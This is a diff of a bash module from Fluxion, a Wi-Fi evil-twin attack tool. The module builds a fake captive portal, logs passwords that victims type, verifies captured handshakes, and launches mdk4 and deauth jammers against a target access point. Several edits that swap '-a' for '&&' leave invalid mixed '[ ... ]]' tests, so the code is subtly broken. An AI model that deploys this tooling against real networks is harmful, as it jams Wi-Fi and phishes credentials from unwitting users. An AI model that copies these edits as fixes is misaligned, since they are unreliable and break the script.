@@ -253,7 +253,7 @@ captive_portal_set_authenticator() {
   # If we're going back, reset everything and abort.
   if [[ \
     "$CaptivePortalAuthenticatorMode" == \
-    "$FLUXIONGeneralBackOption" ]]]; then
+    "$FLUXIONGeneralBackOption" ]]; then
     captive_portal_unset_authenticator
     return -1
   fi
@@ -574,7 +574,7 @@ captive_portal_unset_attack() {
   sandbox_remove_workfile "$FLUXIONWorkspacePath/captive_portal"
 
   # Only reset the AP if one has been defined.
-  if [ "$CaptivePortalAPService" -a "$(type -t ap_service_reset)" ]]; then
+  if [ "$CaptivePortalAPService" && "$(type -t ap_service_reset)" ]]; then
     ap_service_reset
   fi
 }
@@ -706,7 +706,7 @@ index-file.names = (
 " >"$FLUXIONWorkspacePath/lighttpd.conf"
 
   # Configure lighttpd's SSL only if we've got a certificate and its key.
-  if [ -f "$FLUXIONWorkspacePath/server.pem" -a -s "$FLUXIONWorkspacePath/server.pem" ]]; then
+  if [ -f "$FLUXIONWorkspacePath/server.pem" && -s "$FLUXIONWorkspacePath/server.pem" ]]; then
     echo "\
 \$SERVER[\"socket\"] == \":443\" {
     ssl.engine = \"enable\"
@@ -823,7 +823,7 @@ while [[ \$AuthenticatorState = \"running\" ]]; do
         ih=
     fi
 
-    if [ -f \"$FLUXIONWorkspacePath/pwdattempt.txt\" -a -s \"$FLUXIONWorkspacePath/pwdattempt.txt\" ]]; then
+    if [ -f \"$FLUXIONWorkspacePath/pwdattempt.txt\" && -s \"$FLUXIONWorkspacePath/pwdattempt.txt\" ]]; then
         # Save any new password attempt.
         cat \"$FLUXIONWorkspacePath/pwdattempt.txt\" >> \"$CaptivePortalPassLog/$targetSSIDCleanNormalized-$FluxionTargetMAC.log\"
 
@@ -831,7 +831,7 @@ while [[ \$AuthenticatorState = \"running\" ]]; do
         echo -n > \"$FLUXIONWorkspacePath/pwdattempt.txt\"
     fi
 
-    if [ -f \"$FLUXIONWorkspacePath/ip_hits\" -a -s \"$FLUXIONWorkspacePath/ip_hits.txt\" ]]; then
+    if [ -f \"$FLUXIONWorkspacePath/ip_hits\" && -s \"$FLUXIONWorkspacePath/ip_hits.txt\" ]]; then
         cat \"$FLUXIONWorkspacePath/ip_hits\" >> \"$CaptivePortalPassLog/$targetSSIDCleanNormalized-$FluxionTargetMAC-IP.log\"
         echo \" \" >> \"$CaptivePortalPassLog/$targetSSIDCleanNormalized-$FluxionTargetMAC-IP.log\"
         echo -n > \"$FLUXIONWorkspacePath/ip_hits\"
@@ -839,7 +839,7 @@ while [[ \$AuthenticatorState = \"running\" ]]; do
 
 " >>"$FLUXIONWorkspacePath/captive_portal_authenticator.sh"
 
-  if [[ "$CaptivePortalAuthenticatorMode" = "hash"* ]]]; then
+  if [[ "$CaptivePortalAuthenticatorMode" = "hash"* ]]; then
     case "$CaptivePortalAuthenticatorMode" in
       # Cowpatty
       "$CaptivePortalVerificationMethodCowpattyOption")
@@ -909,7 +909,7 @@ while [[ \$AuthenticatorState = \"running\" ]]; do
 
     echo -ne \"\033[K\033[u\"" >>"$FLUXIONWorkspacePath/captive_portal_authenticator.sh"
 
-  if [[ "$CaptivePortalAuthenticatorMode" = "hash"* ]]]; then
+  if [[ "$CaptivePortalAuthenticatorMode" = "hash"* ]]; then
     echo "
     sleep 1" >>"$FLUXIONWorkspacePath/captive_portal_authenticator.sh"
   fi
@@ -940,7 +940,7 @@ Mac: $(captive_portal_get_IP_MAC) ($(captive_portal_get_MAC_brand))
 IP: $(captive_portal_get_client_IP)
 \" >\"$CaptivePortalNetLog/$targetSSIDCleanNormalized-$FluxionTargetMAC.log\"" >>"$FLUXIONWorkspacePath/captive_portal_authenticator.sh"
 
-  if [[ "$CaptivePortalAuthenticatorMode" = "hash"* ]]]; then
+  if [[ "$CaptivePortalAuthenticatorMode" = "hash"* ]]; then
 #    echo "
 # aircrack-ng -a 2 -b $FluxionTargetMAC -0 -s \"$CaptivePortalHashPath\" -w \"$FLUXIONWorkspacePath/candidate.txt\" && echo && echo -e \"The password was saved in "$CRed"$CaptivePortalNetLog/$targetSSIDCleanNormalized-$FluxionTargetMAC.log"$CClr"\"\
 #" >>"$FLUXIONWorkspacePath/captive_portal_authenticator.sh"
@@ -1199,7 +1199,7 @@ fi
 # ============================================================ #
 # ============= < Argument Loaded Configurables > ============ #
 # ============================================================ #
-while [[ "$1" != "" -a "$1" != "--" ]]; do
+while [[ "$1" != "" && "$1" != "--" ]]; do
   case "$1" in
     -a|--ap)
       CaptivePortalAccessPointInterfaceOriginal=$2; shift;;
@@ -1501,14 +1501,14 @@ start_attack() {
         "./$FLUXIONWorkspacePath/captive_portal/deauth-ng.py -i $CaptivePortalJammerInterface -f 5 -c $FluxionTargetChannel -a $FluxionTargetMAC" &
     # Save parent's pid, to get to child later.
     CaptivePortalJammerServiceXtermPID=$!
-  elif [[ $option_deauth -eq 1 ]]]; then
+  elif [[ $option_deauth -eq 1 ]]; then
 
 	xterm $FLUXIONHoldXterm $BOTTOMRIGHT -bg black -fg "#FF0009" \
         -title "FLUXION AP Jammer Service [$FluxionTargetSSID]" -e \
         "mdk4 $CaptivePortalJammerInterface d -c $FluxionTargetChannel -b \"$FLUXIONWorkspacePath/mdk4_blacklist.lst\"" &
         # Save parent's pid, to get to child later.
     	CaptivePortalJammerServiceXtermPID=$!
-  elif [[ $option_deauth -eq 2 ]]]; then
+  elif [[ $option_deauth -eq 2 ]]; then
 
 	xterm $FLUXIONHoldXterm $BOTTOMRIGHT -bg black -fg "#FF0009" \
         -title "FLUXION AP Jammer Service [$FluxionTargetSSID]" -e \
@@ -1516,7 +1516,7 @@ start_attack() {
         # Save parent's pid, to get to child later.
     	CaptivePortalJammerServiceXtermPID=$!
 
-  elif [[ $option_deauth -eq 3 ]]]; then
+  elif [[ $option_deauth -eq 3 ]]; then
 
 	xterm $FLUXIONHoldXterm $BOTTOMRIGHT -bg black -fg "#FF0009" \
         -title "FLUXION AP Jammer Service [$FluxionTargetSSID]" -e \
